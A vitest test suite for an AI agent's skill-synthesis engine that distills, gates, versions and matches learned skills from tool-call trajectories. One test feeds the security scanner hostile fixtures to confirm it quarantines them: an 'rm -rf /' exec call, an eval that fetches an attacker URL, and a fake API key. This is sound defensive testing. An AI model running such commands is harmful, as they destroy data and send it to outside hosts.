/**
 * CoreBlow Cory EvoLoop — Skill Synthesizer Acceptance & E2E Test Suite
 *
 * Validates the 5 formal E2E scenarios and mathematical fitness contracts
 * for the closed-loop autonomous skill synthesis and evolution engine.
 *
 * Scenarios:
 *  1. Distills a skill from Failed Tool Step -> Recovery Step -> Verification Passed
 *     trajectory and syncs Cory Active Constraints into ## Pitfalls & Active Constraints.
 *  2. Blocks Zone 0 (trustZone: "public" / isPublicChannel: true) trajectories from synthesizing skills.
 *  3. Quarantines trajectories containing dangerous child_process.exec or eval( patterns via skill-scanner.ts.
 *  4. Evolves skill from 1.0.0 to 1.1.0, promotes from canary to verified_active after 3 successful outcomes,
 *     and automatically rolls back to 1.0.0 on 2 consecutive failures.
 *  5. Verifies < 2ms skill matching and prompt assembly via buildActiveSkillsPrompt().
 */

import { describe, it, expect, beforeEach, afterEach } from "vitest";
import * as fs from "node:fs/promises";
import * as fsSync from "node:fs";
import * as os from "node:os";
import * as path from "node:path";
import { performance } from "node:perf_hooks";
import { CoryBootstrapService } from "../memory/cory.js";
import {
  CorySkillSynthesizerService,
  computeWilsonLowerBound,
  distillTrajectoryToSkillCandidate,
  isZone0PublicTrajectory,
  parseEvolvingSkillMarkdown,
  serializeEvolvingSkillMarkdown,
  shouldAutoRollbackSkill,
  updateSkillFitnessMetrics,
  type EvolvingSkillRecord,
  type SkillFitnessMetrics,
  type TurnTrajectoryRecord,
} from "./index.js";

function createTempDir(prefix: string): string {
  return fsSync.mkdtempSync(path.join(os.tmpdir(), `coreblow-test-${prefix}-`));
}

function cleanupTempDir(dir: string): void {
  try {
    fsSync.rmSync(dir, { recursive: true, force: true });
  } catch {
    // Ignore cleanup errors in tests
  }
}

describe("Cory EvoLoop — Skill Synthesizer E2E & Evolutionary Suite", () => {
  let stateDir: string;
  let coryDir: string;
  let cory: CoryBootstrapService;
  let synthesizer: CorySkillSynthesizerService;

  beforeEach(async () => {
    stateDir = createTempDir("synthesizer-state");
    coryDir = createTempDir("cory-memory");

    cory = new CoryBootstrapService({ stateDir: coryDir });
    await cory.start();

    synthesizer = new CorySkillSynthesizerService({
      stateDir,
      coryService: cory,
      autoPromoteMinInvocations: 3,
      autoPromoteWilsonScoreThreshold: 0.65,
      autoRollbackConsecutiveFailures: 2,
    });
    await synthesizer.start();
  });

  afterEach(async () => {
    await synthesizer.stop();
    await cory.stop();
    cleanupTempDir(stateDir);
    cleanupTempDir(coryDir);
  });

  // ---------------------------------------------------------------------------
  // Test 1: Distillation & Cory Active Constraints Sync
  // ---------------------------------------------------------------------------
  it("Test 1: Distills a skill from Failed Tool Step -> Recovery Step -> Verification Passed trajectory and syncs Cory Active Constraints into ## Pitfalls & Active Constraints", async () => {
    const workspaceId = "ws-engineering";
    const userScope = "staff-operator";

    // Setup active constraints in Cory Memory Store
    cory.memoryStore.remember({
      layer: "constraint",
      content: "[CONSTRAINT] Always run build before testing",
      scope: { workspaceId, userScope },
    });
    cory.memoryStore.remember({
      layer: "constraint",
      content: "Never delete node_modules without explicit approval",
      scope: { workspaceId, userScope },
    });

    // Verify constraints are present in Cory Memory Store
    const registeredConstraints = cory.memoryStore.listLayerItems("constraint", {
      workspaceId,
      userScope,
    });
    expect(registeredConstraints.length).toBeGreaterThanOrEqual(2);

    // Trajectory with a failed step (isError: true), recovery step (isError: false), and finalOutcome: "success"
    const trajectory: TurnTrajectoryRecord = {
      id: "traj-vitest-corepack-fix",
      userGoal: "run vitest non-interactively without prompt hanging",
      workspaceId,
      userScope,
      steps: [
        {
          toolName: "run_command",
          input: { command: "pnpm vitest run" },
          output: "Interactive prompt detected: Corepack requires [Y/n] input",
          isError: true,
          errorCode: "COREPACK_INTERACTIVE_HANG",
        },
        {
          toolName: "run_command",
          input: { command: "COREPACK_ENABLE_DOWNLOAD_PROMPT=0 pnpm vitest run" },
          output: "Test Files 10 passed, Tests 45 passed (4.2s)",
          isError: false,
        },
      ],
      finalOutcome: "success",
    };

    const result = await synthesizer.ingestTrajectory(trajectory);

    // Assert ingestTrajectory succeeds with canary status
    expect(result.ok).toBe(true);
    expect(result.success).toBe(true);
    expect(result.status).toBe("canary");
    expect(result.skill).toBeDefined();

    const skill = result.skill!;
    expect(skill.version).toBe("1.0.0");
    expect(skill.status).toBe("canary");
    expect(skill.executionStrategy.length).toBeGreaterThanOrEqual(1);

    // Inspect generated markdown file in learned/
    const learnedFilePath = path.join(stateDir, "learned", `${skill.id}.md`);
    expect(fsSync.existsSync(learnedFilePath)).toBe(true);

    const markdownContent = await fs.readFile(learnedFilePath, "utf-8");
    expect(markdownContent).toContain("## Pitfalls & Active Constraints");
    expect(markdownContent).toContain("[CONSTRAINT] Always run build before testing");
    expect(markdownContent).toContain("[CONSTRAINT] Never delete node_modules without explicit approval");
    expect(markdownContent).toContain("Avoid tool failure in run_command");

    // Verify the parsed skill record reflects the synced constraints
    const parsedSkill = parseEvolvingSkillMarkdown(markdownContent);
    expect(parsedSkill.id).toBe(skill.id);
    expect(parsedSkill.pitfallsConstraints).toContain("[CONSTRAINT] Always run build before testing");
    expect(parsedSkill.pitfallsConstraints).toContain("[CONSTRAINT] Never delete node_modules without explicit approval");
  });

  // ---------------------------------------------------------------------------
  // Test 2: Zero-Trust Gate 1 Rejection
  // ---------------------------------------------------------------------------
  it("Test 2: Blocks Zone 0 (trustZone: \"public\" / isPublicChannel: true) trajectories from synthesizing skills", async () => {
    const publicTrajectories: Array<{
      name: string;
      record: TurnTrajectoryRecord;
    }> = [
      {
        name: "trustZone lowercase public",
        record: {
          id: "public-traj-1",
          userGoal: "execute public chat action",
          trustZone: "public",
          steps: [
            { toolName: "run_command", input: { a: 1 }, output: "fail", isError: true },
            { toolName: "run_command", input: { a: 2 }, output: "ok", isError: false },
          ],
          finalOutcome: "success",
        },
      },
      {
        name: "trustZone titlecase Public",
        record: {
          id: "public-traj-2",
          userGoal: "execute public channel task",
          trustZone: "Public" as unknown as "public",
          steps: [
            { toolName: "run_command", input: { a: 1 }, output: "fail", isError: true },
            { toolName: "run_command", input: { a: 2 }, output: "ok", isError: false },
          ],
          finalOutcome: "success",
        },
      },
      {
        name: "isPublicChannel boolean true",
        record: {
          id: "public-traj-3",
          userGoal: "execute discord public chat step",
          isPublicChannel: true,
          steps: [
            { toolName: "run_command", input: { a: 1 }, output: "fail", isError: true },
            { toolName: "run_command", input: { a: 2 }, output: "ok", isError: false },
          ],
          finalOutcome: "success",
        },
      },
      {
        name: "isPublicChannel string 'true'",
        record: {
          id: "public-traj-4",
          userGoal: "execute slack public chat step",
          isPublicChannel: "true" as unknown as boolean,
          steps: [
            { toolName: "run_command", input: { a: 1 }, output: "fail", isError: true },
            { toolName: "run_command", input: { a: 2 }, output: "ok", isError: false },
          ],
          finalOutcome: "success",
        },
      },
    ];

    for (const { name, record } of publicTrajectories) {
      // Pure helper assertion
      expect(isZone0PublicTrajectory(record), `isZone0PublicTrajectory should be true for ${name}`).toBe(true);

      const result = await synthesizer.ingestTrajectory(record);

      // Assert ingestTrajectory rejects with ok: false and code ZONE_0_BLOCKED
      expect(result.ok, `Expected rejected ok: false for ${name}`).toBe(false);
      expect(result.success, `Expected rejected success: false for ${name}`).toBe(false);
      expect(result.error).toBe("ZONE_0_BLOCKED");
      expect(result.reason).toContain("Zone 0 public trajectory rejected");
    }

    // Assert no files were written to learned/
    const learnedDir = path.join(stateDir, "learned");
    const learnedFiles = (await fs.readdir(learnedDir)).filter((f) => f.endsWith(".md"));
    expect(learnedFiles).toHaveLength(0);

    // Assert no skills were indexed in query search
    const matches = await synthesizer.matchSkillsForQuery("public chat action");
    expect(matches).toHaveLength(0);
  });

  // ---------------------------------------------------------------------------
  // Test 3: Gate 2 Security Scanner & Secret Quarantine
  // ---------------------------------------------------------------------------
  it("Test 3: Quarantines trajectories containing dangerous child_process.exec or eval( patterns via skill-scanner.ts", async () => {
    // 3a. Dangerous child_process.exec command
    const dangerousExecTrajectory: TurnTrajectoryRecord = {
      id: "traj-dangerous-exec",
      userGoal: "clean temporary system build caches",
      steps: [
        {
          toolName: "run_command",
          input: {
            script: 'const cp = require("child_process"); cp.exec("rm -rf /");',
          },
          output: "Permission denied",
          isError: true,
        },
        {
          toolName: "run_command",
          input: {
            script: 'const cp = require("child_process"); cp.exec("rm -rf ./tmp");',
          },
          output: "Cleaned ./tmp",
          isError: false,
        },
      ],
      finalOutcome: "success",
    };

    const execResult = await synthesizer.ingestTrajectory(dangerousExecTrajectory);
    expect(execResult.ok).toBe(false);
    expect(execResult.status).toBe("quarantined");
    expect(execResult.quarantineReason).toBeDefined();
    expect(execResult.quarantineReason).toMatch(/child_process|Shell command execution/i);

    const execSkillId = execResult.skill!.id;

    // Written to quarantine/<id>.md
    const execQuarantineFile = path.join(stateDir, "quarantine", `${execSkillId}.md`);
    expect(fsSync.existsSync(execQuarantineFile)).toBe(true);

    // NOT written to learned/
    const execLearnedFile = path.join(stateDir, "learned", `${execSkillId}.md`);
    expect(fsSync.existsSync(execLearnedFile)).toBe(false);

    // NOT indexed in active search
    const execSearch = await synthesizer.matchSkillsForQuery("clean temporary system build caches");
    expect(execSearch).toHaveLength(0);

    // 3b. Dangerous eval(...) dynamic code execution
    const evalTrajectory: TurnTrajectoryRecord = {
      id: "traj-eval-injection",
      userGoal: "evaluate math formula string safely",
      steps: [
        {
          toolName: "run_command",
          input: { code: 'eval("fetch(\'https://attacker.com/leak\')");' },
          output: "Network error",
          isError: true,
        },
        {
          toolName: "run_command",
          input: { code: 'eval("2 + 2");' },
          output: "4",
          isError: false,
        },
      ],
      finalOutcome: "success",
    };

    const evalResult = await synthesizer.ingestTrajectory(evalTrajectory);
    expect(evalResult.ok).toBe(false);
    expect(evalResult.status).toBe("quarantined");
    expect(evalResult.quarantineReason).toMatch(/Dynamic code execution/i);

    const evalSkillId = evalResult.skill!.id;
    const evalQuarantineFile = path.join(stateDir, "quarantine", `${evalSkillId}.md`);
    expect(fsSync.existsSync(evalQuarantineFile)).toBe(true);
    expect(fsSync.existsSync(path.join(stateDir, "learned", `${evalSkillId}.md`))).toBe(false);

    // 3c. Secret leak pattern (e.g. sk-proj-...)
    const secretTrajectory: TurnTrajectoryRecord = {
      id: "traj-secret-leak",
      userGoal: "authenticate against remote openai model endpoint",
      steps: [
        {
          toolName: "run_command",
          input: { key: "sk-proj-123456789012345678901234567890" },
          output: "Bad authentication header",
          isError: true,
        },
        {
          toolName: "run_command",
          input: { key: "sk-proj-123456789012345678901234567890", authType: "Bearer" },
          output: "Authenticated successfully",
          isError: false,
        },
      ],
      finalOutcome: "success",
    };

    const secretResult = await synthesizer.ingestTrajectory(secretTrajectory);
    expect(secretResult.ok).toBe(false);
    expect(secretResult.status).toBe("quarantined");
    expect(secretResult.quarantineReason).toMatch(/Hardcoded secret pattern detected/i);

    const secretSkillId = secretResult.skill!.id;
    const secretQuarantineFile = path.join(stateDir, "quarantine", `${secretSkillId}.md`);
    expect(fsSync.existsSync(secretQuarantineFile)).toBe(true);
    expect(fsSync.existsSync(path.join(stateDir, "learned", `${secretSkillId}.md`))).toBe(false);
  });

  // ---------------------------------------------------------------------------
  // Test 4: Semver Evolution, Canary Promotion & Auto-Rollback
  // ---------------------------------------------------------------------------
  it("Test 4: Evolves skill from 1.0.0 to 1.1.0, promotes from canary to verified_active after 3 successful outcomes, and automatically rolls back to 1.0.0 on 2 consecutive failures", async () => {
    // 4a. Ingest base trajectory -> produces v1.0.0 (status: canary)
    const baseTrajectory: TurnTrajectoryRecord = {
      id: "skill_git-safe-rebase",
      userGoal: "git safe rebase onto origin main",
      steps: [
        {
          toolName: "run_command",
          input: { cmd: "git rebase origin/main" },
          output: "Conflict in config.json",
          isError: true,
        },
        {
          toolName: "run_command",
          input: { cmd: "git checkout --ours config.json && git rebase --continue" },
          output: "Successfully rebased",
          isError: false,
        },
      ],
      finalOutcome: "success",
    };

    const res1 = await synthesizer.ingestTrajectory(baseTrajectory);
    expect(res1.ok).toBe(true);
    const skill1 = res1.skill!;
    expect(skill1.version).toBe("1.0.0");
    expect(skill1.status).toBe("canary");

    // 4b. Ingest refinement trajectory for same skill -> produces v1.1.0 (status: canary)
    const refinementTrajectory: TurnTrajectoryRecord = {
      id: skill1.id,
      userGoal: "git safe rebase onto origin main",
      steps: [
        {
          toolName: "run_command",
          input: { cmd: "git pull --rebase" },
          output: "Cannot rebase: dirty working directory",
          isError: true,
        },
        {
          toolName: "run_command",
          input: { cmd: "git stash && git pull --rebase origin main && git stash pop" },
          output: "Fast-forward rebase complete",
          isError: false,
        },
      ],
      finalOutcome: "success",
    };

    const res2 = await synthesizer.ingestTrajectory(refinementTrajectory);
    expect(res2.ok).toBe(true);
    const skill2 = res2.skill!;
    expect(skill2.version).toBe("1.1.0");
    expect(skill2.status).toBe("canary");

    // Assert prior version 1.0.0 is saved in .revisions/<id>@1.0.0.md
    const snapshotPath = path.join(stateDir, ".revisions", `${skill1.id}@1.0.0.md`);
    expect(fsSync.existsSync(snapshotPath)).toBe(true);

    const snapshotContent = await fs.readFile(snapshotPath, "utf-8");
    const snapshotSkill = parseEvolvingSkillMarkdown(snapshotContent);
    expect(snapshotSkill.version).toBe("1.0.0");

    // 4c. Record 3 successful outcomes via recordSkillOutcome(skill.id, "success")
    const out1 = await synthesizer.recordSkillOutcome(skill2.id, "success");
    expect(out1.metrics.successfulInvocations).toBe(1);
    expect(out1.status).toBe("canary");

    const out2 = await synthesizer.recordSkillOutcome(skill2.id, "success");
    expect(out2.metrics.successfulInvocations).toBe(2);
    expect(out2.status).toBe("canary");

    const out3 = await synthesizer.recordSkillOutcome(skill2.id, "success");
    expect(out3.metrics.successfulInvocations).toBe(3);
    expect(out3.metrics.consecutiveFailures).toBe(0);
    // Auto-promotes to verified_active on 3 successes with 0 failures
    expect(out3.status).toBe("verified_active");

    // 4d. Record 2 consecutive failures via recordSkillOutcome(skill.id, "failure")
    const fail1 = await synthesizer.recordSkillOutcome(skill2.id, "failure");
    expect(fail1.metrics.consecutiveFailures).toBe(1);
    // Still at 1.1.0 after only 1 failure
    expect(fail1.version).toBe("1.1.0");

    // Second failure triggers circuit breaker auto-rollback
    const fail2 = await synthesizer.recordSkillOutcome(skill2.id, "failure");

    // Assert circuit breaker rolled back skill to 1.0.0, restoring content from .revisions/
    expect(fail2.version).toBe("1.0.0");
    expect(fail2.metrics.consecutiveFailures).toBe(0);

    // Verify disk content in learned/ is now restored to 1.0.0
    const activeLearnedPath = path.join(stateDir, "learned", `${skill2.id}.md`);
    const activeMarkdown = await fs.readFile(activeLearnedPath, "utf-8");
    const activeParsed = parseEvolvingSkillMarkdown(activeMarkdown);
    expect(activeParsed.version).toBe("1.0.0");
  });

  // ---------------------------------------------------------------------------
  // Test 5: Sub-2ms Skill Matching & Prompt Assembly
  // ---------------------------------------------------------------------------
  it("Test 5: Verifies < 2ms skill matching and prompt assembly via buildActiveSkillsPrompt()", async () => {
    // Seed synthesizer with multiple distinct verified skills
    const seedSkillsData: Array<{
      id: string;
      title: string;
      userGoal: string;
      triggers: string[];
    }> = [
      {
        id: "skill_vitest-runner",
        title: "Non-interactive Vitest & Corepack Execution",
        userGoal: "Non-interactive Vitest & Corepack Execution",
        triggers: ["vitest", "unit-test", "corepack", "test"],
      },
      {
        id: "skill_docker-multi-stage",
        title: "Docker Multi-Stage Optimization",
        userGoal: "Docker Multi-Stage Optimization",
        triggers: ["docker", "container", "multistage", "image"],
      },
      {
        id: "skill_tsgo-fast-check",
        title: "Fast TypeScript Diagnostics with tsgo",
        userGoal: "Fast TypeScript Diagnostics with tsgo",
        triggers: ["typescript", "tsgo", "typecheck", "types"],
      },
      {
        id: "skill_git-bisect-automated",
        title: "Automated Git Bisect Regression Finder",
        userGoal: "Automated Git Bisect Regression Finder",
        triggers: ["git", "bisect", "regression", "commit"],
      },
      {
        id: "skill_postgres-wal-compact",
        title: "PostgreSQL WAL Compaction and Checkpoint",
        userGoal: "PostgreSQL WAL Compaction and Checkpoint",
        triggers: ["postgres", "database", "wal", "checkpoint"],
      },
    ];

    for (const seed of seedSkillsData) {
      const traj: TurnTrajectoryRecord = {
        id: seed.id,
        userGoal: seed.userGoal,
        steps: [
          { toolName: "run_command", input: { step: 1 }, output: "retry required", isError: true },
          { toolName: "run_command", input: { step: 2 }, output: "execution verified", isError: false },
        ],
        finalOutcome: "success",
      };
      const res = await synthesizer.ingestTrajectory(traj, {
        targetStatus: "verified_active",
      });
      expect(res.ok).toBe(true);
      expect(res.skill?.status).toBe("verified_active");
    }

    // Warm-up call to prime the V8 inline caches
    await synthesizer.matchSkillsForQuery("vitest test");

    // Measure execution latency of matchSkillsForQuery
    const iterations = 10;
    const latencies: number[] = [];

    for (let i = 0; i < iterations; i++) {
      const t0 = performance.now();
      const matches = await synthesizer.matchSkillsForQuery("vitest unit-test non-interactive");
      const elapsed = performance.now() - t0;
      latencies.push(elapsed);

      expect(matches.length).toBeGreaterThan(0);
      expect(matches[0]!.title).toMatch(/Vitest/i);
    }

    // Assert each iteration latency is strictly < 2ms
    for (const latency of latencies) {
      expect(latency).toBeLessThan(2.0);
    }

    const averageLatency = latencies.reduce((a, b) => a + b, 0) / latencies.length;
    expect(averageLatency).toBeLessThan(1.0);

    // Call buildActiveSkillsPrompt()
    const prompt = await synthesizer.buildActiveSkillsPrompt();

    // Assert it returns formatted context block containing active skills, triggers, and execution strategy
    expect(prompt).toContain("<learned_skills>");
    expect(prompt).toContain("</learned_skills>");
    expect(prompt).toContain("# Active Learned Skills");
    expect(prompt).toContain("Non-interactive Vitest & Corepack Execution");
    expect(prompt).toContain("Docker Multi-Stage Optimization");
    expect(prompt).toContain("Fast TypeScript Diagnostics with tsgo");
    expect(prompt).toContain("Triggers:");
    expect(prompt).toContain("### Verified Procedure");
    expect(prompt).toContain("### Pitfalls & Active Constraints");
    expect(prompt).toContain("### Verification Standard");

    // Also assert prompt assembly with filtered match subset
    const specificMatches = await synthesizer.matchSkillsForQuery("docker container image");
    expect(specificMatches.length).toBeGreaterThan(0);

    const specificPrompt = await synthesizer.buildActiveSkillsPrompt(specificMatches);
    expect(specificPrompt).toContain("Docker Multi-Stage Optimization");
    expect(specificPrompt).not.toContain("PostgreSQL WAL Compaction");
  });

  // ---------------------------------------------------------------------------
  // Supplementary Pure Mathematical & Contract Units
  // ---------------------------------------------------------------------------
  describe("Pure Mathematical Contracts & Utilities", () => {
    it("computeWilsonLowerBound returns correct conservative bounds", () => {
      // 0 sample edge case
      expect(computeWilsonLowerBound(0, 0)).toBe(0);
      expect(computeWilsonLowerBound(0, 10)).toBe(0);

      // Single fluke (1/1) confidence is heavily penalized compared to 1.0
      const singleFluke = computeWilsonLowerBound(1, 1);
      expect(singleFluke).toBeGreaterThan(0.1);
      expect(singleFluke).toBeLessThan(0.4);

      // 3/3 successes
      const threeSuccess = computeWilsonLowerBound(3, 3);
      expect(threeSuccess).toBeGreaterThan(0.35);

      // 100/100 successes yields high confidence
      const largeSample = computeWilsonLowerBound(100, 100);
      expect(largeSample).toBeGreaterThan(0.95);
    });

    it("updateSkillFitnessMetrics updates metrics immutably", () => {
      const initial: SkillFitnessMetrics = {
        totalInvocations: 0,
        successfulInvocations: 0,
        failedInvocations: 0,
        consecutiveFailures: 0,
        wilsonScore: 0,
        lastUpdatedMs: 1000,
      };

      const s1 = updateSkillFitnessMetrics(initial, "success", 2000);
      expect(s1.totalInvocations).toBe(1);
      expect(s1.successfulInvocations).toBe(1);
      expect(s1.failedInvocations).toBe(0);
      expect(s1.consecutiveFailures).toBe(0);
      expect(s1.lastUpdatedMs).toBe(2000);

      const f1 = updateSkillFitnessMetrics(s1, "failure", 3000);
      expect(f1.totalInvocations).toBe(2);
      expect(f1.successfulInvocations).toBe(1);
      expect(f1.failedInvocations).toBe(1);
      expect(f1.consecutiveFailures).toBe(1);

      const f2 = updateSkillFitnessMetrics(f1, "failure", 4000);
      expect(f2.consecutiveFailures).toBe(2);
      expect(shouldAutoRollbackSkill(f2)).toBe(true);
    });

    it("serialize and parse markdown round-trips with high fidelity", () => {
      const sampleSkill: EvolvingSkillRecord = {
        id: "skill_sample",
        slug: "sample-skill",
        version: "1.2.0",
        title: "Sample Skill Title",
        description: "Sample description explaining trigger heuristics",
        status: "verified_active",
        triggers: Object.freeze(["sample", "test-trigger"]),
        executionStrategy: Object.freeze(["1. Run first step", "2. Run second step"]),
        pitfallsConstraints: Object.freeze(["[CONSTRAINT] Must not fail", "Avoid timeout"]),
        verificationCriteria: Object.freeze(["Verify exitCode === 0"]),
        metrics: {
          totalInvocations: 5,
          successfulInvocations: 5,
          failedInvocations: 0,
          consecutiveFailures: 0,
          wilsonScore: 0.72,
          lastUpdatedMs: 1700000000000,
        },
        createdAtMs: 1690000000000,
        updatedAtMs: 1700000000000,
      };

      const markdown = serializeEvolvingSkillMarkdown(sampleSkill);
      const parsed = parseEvolvingSkillMarkdown(markdown);

      expect(parsed.id).toBe(sampleSkill.id);
      expect(parsed.slug).toBe(sampleSkill.slug);
      expect(parsed.version).toBe(sampleSkill.version);
      expect(parsed.title).toBe(sampleSkill.title);
      expect(parsed.status).toBe(sampleSkill.status);
      expect(parsed.triggers).toEqual(sampleSkill.triggers);
      expect(parsed.pitfallsConstraints).toEqual(sampleSkill.pitfallsConstraints);
      expect(parsed.verificationCriteria).toEqual(sampleSkill.verificationCriteria);
      expect(parsed.metrics.totalInvocations).toBe(sampleSkill.metrics.totalInvocations);
    });
  });
});
